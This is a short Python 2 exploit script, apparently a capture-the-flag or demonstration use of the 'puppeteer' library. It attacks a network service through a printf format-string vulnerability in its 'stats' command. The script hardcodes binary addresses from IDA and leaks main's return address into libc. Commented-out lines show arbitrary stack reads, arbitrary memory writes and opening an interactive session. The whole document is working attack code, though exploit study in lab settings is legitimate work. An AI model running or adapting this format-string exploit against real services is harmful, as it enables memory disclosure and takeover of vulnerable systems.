import puppeteer
import telnetlib

import logging

class Aggravator(puppeteer.Manipulator):
    def __init__(self, host, port):
        puppeteer.Manipulator.__init__(self, puppeteer.x86)

        self.t = telnetlib.Telnet(host, port)
        self.s = self.t.get_socket()
        self.f = self.s.makefile()

        self.t.set_debuglevel(10)
        self.t.read_until("> ")

        self.t.set_debuglevel(0)

    @puppeteer.printf_flags(bytes_to_fmt=244, max_fmt_size=31)
    def stats_printf(self, fmt):
        self.s.sendall("stats " + fmt + "\n")
        self.t.read_until("kill top:\n")
        try:
            result = self.t.read_until("\n"*5, timeout=3)[:-5]
            self.t.read_until("> ", timeout=3)
        except EOFError:
            print "Program didn't finish the print"
            return ""
        return result

def main():
    logging.getLogger("puppeteer.manipulator").setLevel(logging.DEBUG)
    logging.getLogger("puppeteer.formatter").setLevel(logging.DEBUG)

    # Create the Aggravator!
    a = Aggravator(sys.argv[1], int(sys.argv[2]))

    # ... and give it some initial info from IDA
    # TODO: maybe use IDALink to get this automatically?
    a.locations['main'] = 0x0804A9B3
    a.locations['#main_end'] = 0x0804A9D1
    a.info['main_stackframe_size'] = 0x24

    # And now, we can to stuff!

    # We can read the stack!
    #print a.read_stack(100).encode('hex')

    # We can overwrite memory with ease!
    #a.do_memory_write(0x0804C344, "ABCD")
    #a.s.send("quit\n")
    #a.t.interact()

    # We can figure out where __libc_start_main is!
    print "main() will return to (presumably, this is in libc):",hex(a.main_return_address(start_offset=390))


if __name__ == '__main__':
    import sys
    main()
